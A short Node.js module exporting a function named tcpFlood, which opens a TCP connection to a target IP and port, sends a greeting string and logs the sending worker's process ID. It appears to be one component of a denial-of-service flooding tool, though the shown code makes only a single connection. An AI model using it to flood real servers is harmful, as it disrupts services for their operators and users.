// Include Nodejs' net module.
const Net = require('net');

function tcpFlood(ip, port, timout, pid) {
    return new Promise((resolve, reject) => {
        // Create a new TCP client.
        const socket = new Net.Socket();
        // Send a connection request to the server.
        socket.connect({port: port, host: ip}, function () {
            // If there is no error, the server has accepted the request and created a new
            // socket dedicated to us.
            // The client can now send data to the server by writing to its socket.
            socket.write('Hello, server.');
            console.log('Worker pid: ' + pid + ' sent package TCP to ' + ip + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
            resolve()
        });

        socket.on('error', function (error) {
            console.log('Error found', error);
            reject(error)
        });
    });
}

module.exports = tcpFlood;
